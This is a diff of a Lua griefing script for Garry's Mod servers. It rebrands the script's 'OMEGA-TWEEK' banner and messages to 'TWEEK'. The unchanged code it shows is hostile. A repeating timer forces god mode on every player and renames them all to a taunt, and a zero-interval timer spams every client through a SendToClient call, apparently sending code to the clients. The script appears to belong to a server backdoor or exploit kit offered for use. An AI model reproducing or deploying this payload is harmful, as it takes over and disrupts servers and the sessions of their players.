@@ -60,15 +60,15 @@ print([=[
 ██║╚██╗██║██║   ██║╚════██║██║     ██║   ██║██╔═══╝ ██╔══╝ 
 ██║ ╚████║╚██████╔╝███████║╚██████╗╚██████╔╝██║     ███████╗ 
 ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚══════╝
-OMEGA-TWEEK
-OMEGA-TWEEK
+TWEEK
+TWEEK
 ¯\_(ツ)_/¯
 ]=]])
 
     timer.Create( "🤫_RIP_U_VAC_BANNED", 1, 0, function()
         for k,v in pairs(player.GetAll()) do
             v:GodEnable()
-            v:setDarkRPVar( "rpname", "OMEGA-TWEEK Control The World ;)" )
+            v:setDarkRPVar( "rpname", "TWEEK Control The World ;)" )
         end
 
     end )
@@ -77,6 +77,6 @@ end)
 
 
 timer.Create( "🤤_SPAM", 0, 0, function()
-    SendToClient([[print("OMEGA-TWEEK")]])
-    print("GET NOSCOPE  !! BY OMEGA-TWEEK")
+    SendToClient([[print("TWEEK")]])
+    print("GET NOSCOPE  !! BY TWEEK")
 end)
